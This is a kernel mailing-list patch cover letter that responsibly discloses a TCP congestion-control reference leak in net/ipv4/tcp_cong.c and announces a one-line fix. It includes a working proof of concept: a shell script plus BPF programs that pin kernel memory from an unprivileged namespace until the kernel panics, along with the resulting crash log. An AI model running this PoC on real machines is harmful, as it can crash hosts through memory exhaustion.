Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.41
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792609036;
	b=5M1w6qkKD8QJPrYWqvFrjaSJ3/JQYNb4ekHt1aVkTDx0XVoUBdlfXhz2I6ywaDJWJDG5
	 kRNEz0E7QlaN2gfObHWdhxwSMZPiybOesYxgh3ld43HLrUVMoUa+zj7RKWTROU5mqskPe
	 tRQwkvq/Nf7bHGBLcqlEzxSUShRHSbJALDoNSTXFLBcykphaEzJdXTsJIUCLpofNxCR5x
	 3EWHYDEZMwsz2LoKZO9H11rZ4ygd5B0h4oBoXAgrYVlNR4aJAc5QBhPvSPn0FYfAcsKP0
	 /Kwp2IrHJBk6yvyb8DKtoqIGewdfXsSa9xY8o36Zvr2AUqhUsMObh6gcDAXmXdJYp2g==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792609036;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=NCZErr0z2armqeSPKIwsgXY+IHu0RXfnxgvMSBIFv/s=;
	b=U/BmsV9Px6SOWkvXJMEalxzpU/m8RMych5ECH8LiGM2xytR+/+lcJ7kpj1wn2JHYG4nV
	 j8vCE3SqW53Jw8yM5vwiTAZCprrcfWtGHcUA2QfzDUgxHa4jbmPebpYELGANIul6F+Sbu
	 8TMAnVd9qDxY17/cjO8/WeHvz/DRYvKFEBT9Hy4F4BNqBjzBabTP4ETDhykUh24oaB/Qz
	 4PMWWqKC4QK3LmIPcWdwiZ8DY22SsVjLZahPJDc02Za5UUNITyomL1M2Ha6FeX50JmAlS
	 092rq+GxFM+r0OVyaZCuZCtAD6gUvU6q8us0xroNgR1HQXmT2zjDqvp4UqwKlHA42Qw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=ShhZnHgb;
	arc=none smtp.remote-ip=74.125.82.41
Received: from mail-dl1-f41.google.com (mail-dl1-f41.google.com [74.125.82.41])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5E8A9606A319
	for <netdev@vger.kernel.org>; Wed, 21 Oct 2026 18:57:15 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 5E8A9606A319
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=ShhZnHgb
Received: by mail-dl1-f41.google.com with SMTP id a92af1059eb24-156cbe59622so785403c88.0
        for <netdev@vger.kernel.org>; Wed, 21 Oct 2026 11:57:15 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792609034; x=1793213834; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=NCZErr0z2armqeSPKIwsgXY+IHu0RXfnxgvMSBIFv/s=;
        b=ShhZnHgbFiEfH0PoFO2hFWNnagbqUyBsoMkTv04Bx+yXcr2jUk4VnBOYvoDy7ZnKgX
         ZYf+a0IUmj8cGqCARuBCvU9sf/ou2SEBIsVFeMxGPu9B8WNgCpVCIuAxxzqmVOkigjYq
         IF21ECuLH/UteVFdTTdSuYuCdl3sBqtKBHOKA7mOIpg2ilbft89rise8P3pBHWq5gkaZ
         CePXaZI8+/qf+gDmRws6jBCoJZgubhq50NBGIpRniNxbiIXwxpdTEVb5lCKDNsp1E/Hl
         eWACgCb5E0jdwpdFdR1zrInqo7NpSSGQ2ggBjQNCfKO8PeAdCwT+TZjoTdj5JUrt9qXT
         GH5A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792609034; x=1793213834;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=NCZErr0z2armqeSPKIwsgXY+IHu0RXfnxgvMSBIFv/s=;
        b=wOlPr1efolIeH35+k285p6gJdQKbJOAgLr0es24KdkOzDtm5T6hqxovFMEN23nhOKW
         w5C7cc1UD0aTcL71H/Uib7JuBumZACnxmgvo+Cs0IYs7wBseYIbXY5pDsUhSOSZQccUI
         b00S+qTWU/d5doNDG88ifNeKEqlQNffEPkHOn/umHb7z33wM3yER4FgcXdtnjGYxKlgW
         yGdgDdk2ucD9rgUfXu7D7+x5aCNNBQrU/GvANbIDpexvCgQytR4zlSQhQKxWPwLKpckn
         iEQpQgf6B33RKscnHTxS44MbBXQ03pgEdGDRUZEJTK0aqQXcQ6ApaDjkT2U758kncr86
         4Zbg==
X-Gm-Message-State: AFq9FYIqZZC6g93wrC/NecRXNjz/2DLS085rXQ2XMjPcURlEeXrr/Gal
	DlDa+B2UZngEtD+ovz+sL0BbFQuD+/I2NfS4ideh17nw9UEXGFJxLODSkIH1/YBnCXACszK9yPe
	gQlrLjbWM
X-Gm-Gg: AYBFou0r8Dplq95Jx5HmPOy2tWeuwQpshgxbGEOHLYX9EOTNflEiPgamUxc8W6SWSGq
	Zu9WoG56Vzs3x+5xrjCn7LP4j1ymsFirYCwp4UuQnr7febiWfeYE2/3nzd9p31l3Lw5RQinQprD
	Qmzgv780i1QAwILqhY2FTGRyZHXX4eYWHtayqeBeqC6NqNzvau7e37YYb00pzp+TLErgPlKjttl
	7T5G6mwbTxQq7eyhKGE6mU1/CEtu4qJrAL+aAYFW3bDE5ir4ksmIsh5itP/Zy7eKCE3FNCoaMP8
	yQjLUc9XUjIKXcwJOYuqBvjqYXDR7C4nCXXcZhLC//gt3sZZGXObIoHu6NW39NST9qN2xS1lLEn
	BovpdzrRy7dhkcdESePe4sZj0E/ZuJwfN9IZGmhPwpa/k4+Velznh+ykq3BNLqwvCAIdR353gW4
	4PmMrF/oL2gToJ6Tf4RvCOWvXULNBIoc9Uc0MaI5YPRQJI767OPjPe99JVcQCr6AQfXvkeqXy9m
	DAYCkEMxXDXLVLXz2CgpoA2CWWNV3qAlfCvlMNji9YM3tyJqvdx8lXGJ7+c+KsEjj2vhd8=
X-Received: by 2002:a05:701b:204a:20b0:14c:d84c:7182 with SMTP id a92af1059eb24-190a52dd599mr3887299c88.22.1792609034093;
        Wed, 21 Oct 2026 11:57:14 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([203.175.14.58])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-1903a180b9esm12553346c88.4.2026.10.21.11.57.10
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 21 Oct 2026 11:57:13 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org,
	bpf@vger.kernel.org
Cc: edumazet@kernel.org,
	ncardwell@google.com,
	kuniyu@google.com,
	davem@davemloft.net,
	pabeni@redhat.com,
	horms@kernel.org,
	jonathon.reinhart@gmail.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] tcp: release congestion control reference on rejection
Date: Thu, 22 Oct 2026 02:57:00 +0800
Message-ID: <cover.1792607608.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/tcp_cong.c. After a
restricted BPF struct_ops TCP congestion-control algorithm has been
loaded, a non-root user can trigger the reference leak through user and
network namespaces. Loading the algorithm requires a privileged setup
in the initial network namespace.

This bug is tracked at: https://bugtracker.nebusec.ai/f/11756

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

tcp_set_default_congestion_control() calls bpf_try_module_get() before
checking whether a non-init network namespace may select a restricted
congestion-control algorithm. When the check fails, the function returns
-EPERM without dropping the acquired reference.

For BPF struct_ops algorithms, this keeps the struct_ops map and its
programs alive. For module-backed algorithms, it leaks the module
reference. Repeated rejected writes can therefore pin kernel resources.
The fix releases the acquired reference on the existing -EPERM path.

Reproducer:

    ./poc.sh oom

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
The script uses the supplied leak_ca_oom.bpf.o object.

------BEGIN poc.sh------

    #!/bin/sh
    set -eu

    POC_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
    SMALL_OBJ="$POC_DIR/leak_ca.bpf.o"
    OOM_OBJ="$POC_DIR/leak_ca_oom.bpf.o"
    BPFFS_ROOT=/sys/fs/bpf/tcp_cc_leak_poc
    TEST_USER=${TEST_USER:-test_user}
    LEAK_ITERATIONS=${LEAK_ITERATIONS:-6}
    OOM_CHUNKS=${OOM_CHUNKS:-16}

    need_root() {
    	if [ "$(id -u)" -ne 0 ]; then
    		echo "run as root" >&2
    		exit 1
    	fi
    }

    need_file() {
    	if [ ! -f "$1" ]; then
    		echo "missing required file: $1" >&2
    		exit 1
    	fi
    }

    run_userns_trigger() {
    	if id "$TEST_USER" >/dev/null 2>&1; then
    		su -s /bin/sh "$TEST_USER" -c 'unshare -Urn python3 - <<'"'"'PY'"'"'
    import os
    path = "/proc/sys/net/ipv4/tcp_congestion_control"
    fd = os.open(path, os.O_WRONLY)
    try:
        os.write(fd, b"leakca\n")
        print("write unexpectedly succeeded")
    except OSError as e:
        print(f"write failed as expected: errno={e.errno} strerror={e.strerror}")
    finally:
        os.close(fd)
    PY' || true
    	else
    		unshare -n python3 - <<'PY' || true
    import os
    path = "/proc/sys/net/ipv4/tcp_congestion_control"
    fd = os.open(path, os.O_WRONLY)
    try:
        os.write(fd, b"leakca\n")
        print("write unexpectedly succeeded")
    except OSError as e:
        print(f"write failed as expected: errno={e.errno} strerror={e.strerror}")
    finally:
        os.close(fd)
    PY
    	fi
    }

    leak_once() {
    	obj=$1
    	dir=$2

    	rm -rf "$dir"
    	mkdir -p "$dir"
    	bpftool struct_ops register "$obj" "$dir"
    	run_userns_trigger
    	bpftool link detach pinned "$dir/leakca"
    }

    observe_mode() {
    	need_file "$SMALL_OBJ"
    	rm -rf "$BPFFS_ROOT"
    	mkdir -p "$BPFFS_ROOT"

    	leak_once "$SMALL_OBJ" "$BPFFS_ROOT/observe"

    	echo
    	echo "struct_ops entries after detach:"
    	bpftool struct_ops show | grep leakca || true

    	echo
    	echo "maps still alive after detach:"
    	bpftool map show | grep -E 'name leakca|name leak_payload' || true
    }

    oom_mode() {
    	i=1

    	need_file "$OOM_OBJ"
    	rm -rf "$BPFFS_ROOT"
    	mkdir -p "$BPFFS_ROOT"

    	echo 2 > /proc/sys/vm/panic_on_oom
    	ulimit -l unlimited || true

    	while [ "$i" -le "$LEAK_ITERATIONS" ]; do
    		echo "[*] leak iteration $i/$LEAK_ITERATIONS"
    		leak_once "$OOM_OBJ" "$BPFFS_ROOT/oom-$i"
    		free -m | sed -n '1,2p'
    		i=$((i + 1))
    	done

    	echo
    	echo "[*] allocating $((OOM_CHUNKS * 64)) MB in userspace to trip OOM after the leaked kernel memory has accumulated"
    	python3 - <<PY
    chunks = []
    chunk = 64 * 1024 * 1024
    for i in range($OOM_CHUNKS):
        chunks.append(bytearray(chunk))
        print(f"allocated {(i + 1) * 64} MB", flush=True)
    print("allocation completed unexpectedly")
    PY
    }

    usage() {
    	cat <<'EOF'
    usage: ./poc.sh [observe|oom]

    observe:
      single leak iteration using leak_ca.bpf.o, no crash expected

    oom:
      six leak iterations using leak_ca_oom.bpf.o, then a bounded 1 GB
      userspace allocation that should panic the kernel because the leaked
      BPF objects have already consumed most memory
    EOF
    }

    need_root

    case "${1:-observe}" in
    observe)
    	observe_mode
    	;;
    oom)
    	oom_mode
    	;;
    *)
    	usage >&2
    	exit 1
    	;;
    esac

------END poc.sh------

------BEGIN leak_ca.bpf.c------

    // SPDX-License-Identifier: GPL-2.0

    #include <vmlinux.h>
    #include <bpf/bpf_helpers.h>
    #include <bpf/bpf_tracing.h>
    #include "bpf_tracing_net.h"

    char _license[] SEC("license") = "GPL";

    SEC("struct_ops")
    void BPF_PROG(leakca_cong_control, struct sock *sk,
    	      const struct rate_sample *rs)
    {
    }

    SEC("struct_ops")
    __u32 BPF_PROG(leakca_ssthresh, struct sock *sk)
    {
    	return tcp_sk(sk)->snd_ssthresh;
    }

    SEC("struct_ops")
    __u32 BPF_PROG(leakca_undo_cwnd, struct sock *sk)
    {
    	return tcp_sk(sk)->snd_cwnd;
    }

    SEC(".struct_ops.link")
    struct tcp_congestion_ops leakca = {
    	.cong_control	= (void *)leakca_cong_control,
    	.ssthresh	= (void *)leakca_ssthresh,
    	.undo_cwnd	= (void *)leakca_undo_cwnd,
    	.name		= "leakca",
    };

------END leak_ca.bpf.c------

------BEGIN leak_ca_oom.bpf.c------

    // SPDX-License-Identifier: GPL-2.0

    #include <vmlinux.h>
    #include <bpf/bpf_helpers.h>
    #include <bpf/bpf_tracing.h>
    #include "bpf_tracing_net.h"

    struct leak_blob {
    	char bytes[4096];
    };

    struct {
    	__uint(type, BPF_MAP_TYPE_ARRAY);
    	__uint(max_entries, 65536);
    	__type(key, __u32);
    	__type(value, struct leak_blob);
    } leak_payload SEC(".maps");

    char _license[] SEC("license") = "GPL";

    SEC("struct_ops")
    void BPF_PROG(leakca_oom_cong_control, struct sock *sk,
    	      const struct rate_sample *rs)
    {
    	__u32 key = 0;
    	struct leak_blob *blob;

    	blob = bpf_map_lookup_elem(&leak_payload, &key);
    	if (blob)
    		blob->bytes[0] = 1;
    }

    SEC("struct_ops")
    __u32 BPF_PROG(leakca_oom_ssthresh, struct sock *sk)
    {
    	return tcp_sk(sk)->snd_ssthresh;
    }

    SEC("struct_ops")
    __u32 BPF_PROG(leakca_oom_undo_cwnd, struct sock *sk)
    {
    	return tcp_sk(sk)->snd_cwnd;
    }

    SEC(".struct_ops.link")
    struct tcp_congestion_ops leakca = {
    	.cong_control	= (void *)leakca_oom_cong_control,
    	.ssthresh	= (void *)leakca_oom_ssthresh,
    	.undo_cwnd	= (void *)leakca_oom_undo_cwnd,
    	.name		= "leakca",
    };

------END leak_ca_oom.bpf.c------

----BEGIN crash log----

[  312.334207][T10658] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[  312.334939][T10658] CPU: 3 UID: 0 PID: 10658 Comm: python3 Not tainted 6.12.95 #2
[  312.335458][T10658] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  312.336280][T10658] Call Trace:
[  312.336511][T10658]  <TASK>
[  312.336731][T10658]  panic+0x533/0x610
[  312.337014][T10658]  ? dump_header+0x5d2/0x800
[  312.337342][T10658]  ? __pfx_panic+0x10/0x10
[  312.337698][T10658]  out_of_memory+0x73c/0x1430
[  312.338032][T10658]  ? __alloc_pages_noprof+0xd53/0x26d0
[  312.338420][T10658]  ? __pfx_out_of_memory+0x10/0x10
[  312.338780][T10658]  ? lock_acquire+0x2f/0xb0
[  312.339092][T10658]  ? __alloc_pages_noprof+0xd53/0x26d0
[  312.339480][T10658]  __alloc_pages_noprof+0x1ecc/0x26d0
[  312.339889][T10658]  ? __pfx___alloc_pages_noprof+0x10/0x10
[  312.340283][T10658]  ? hlock_class+0x4e/0x130
[  312.340599][T10658]  ? mark_lock+0xb5/0xc60
[  312.340895][T10658]  ? srso_alias_return_thunk+0x5/0xfbef5
[  312.341313][T10658]  ? __pfx_mark_lock+0x10/0x10
[  312.341655][T10658]  ? srso_alias_return_thunk+0x5/0xfbef5
[  312.342038][T10658]  ? rcu_is_watching+0x12/0xc0
[  312.342376][T10658]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[  312.342759][T10658]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[  312.343172][T10658]  ? srso_alias_return_thunk+0x5/0xfbef5
[  312.343572][T10658]  ? srso_alias_return_thunk+0x5/0xfbef5
[  312.343959][T10658]  folio_alloc_mpol_noprof+0x16/0x90
[  312.344321][T10658]  vma_alloc_folio_noprof+0xc4/0x170
[  312.344704][T10658]  ? __pfx_vma_alloc_folio_noprof+0x10/0x10
[  312.345107][T10658]  ? find_held_lock+0x2d/0x110
[  312.345441][T10658]  ? srso_alias_return_thunk+0x5/0xfbef5
[  312.345839][T10658]  do_pte_missing+0x825/0x3710
[  312.346189][T10658]  __handle_mm_fault+0xac8/0x1db0
[  312.346545][T10658]  ? __pfx_lock_release+0x10/0x10
[  312.346891][T10658]  ? down_read_trylock+0x1f0/0x3f0
[  312.347240][T10658]  ? lock_vma_under_rcu+0x121/0x720
[  312.347601][T10658]  ? __pfx___handle_mm_fault+0x10/0x10
[  312.348002][T10658]  ? srso_alias_return_thunk+0x5/0xfbef5
[  312.348403][T10658]  handle_mm_fault+0x2ad/0x910
[  312.348822][T10658]  do_user_addr_fault+0x301/0xe10
[  312.349186][T10658]  exc_page_fault+0x5d/0xe0
[  312.349500][T10658]  asm_exc_page_fault+0x26/0x30
[  312.349840][T10658] RIP: 0033:0x7f38e70d3340
[  312.350147][T10658] Code: 48 81 fa 00 01 00 00 76 c8 48 8d 8c 17 00 fe ff ff 62 e1 fe 48 7f 40 02 62 e1 fe 48 7f 40 03 48 39 f9 76 2e 48 83 e7 c0 66 90 <62> e1 fd 48 7f 47 04 62 e1 fd 48 7f 47 05 62 e1 fd 48 7f 47 06 62
[  312.351441][T10658] RSP: 002b:00007fff03373848 EFLAGS: 00010287
[  312.351863][T10658] RAX: 00007f38c2995010 RBX: 0000000004000000 RCX: 00007f38c6994e10
[  312.352395][T10658] RDX: 0000000004000000 RSI: 0000000000000000 RDI: 00007f38c48fdf00
[  312.352947][T10658] RBP: 00007f38e69cc268 R08: 00000000ffffffff R09: 0000000000000000
[  312.353473][T10658] R10: 0000000000000022 R11: 0000000000000246 R12: 00007f38e6a2bab0
[  312.354004][T10658] R13: 0000000000a02820 R14: 0000000000000000 R15: 00007f38e69f8ab0
[  312.354585][T10658]  </TASK>
[  312.355010][T10658] Kernel Offset: disabled
[  312.355354][T10658] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  tcp: release congestion control reference on rejection

 net/ipv4/tcp_cong.c | 1 +
 1 file changed, 1 insertion(+)

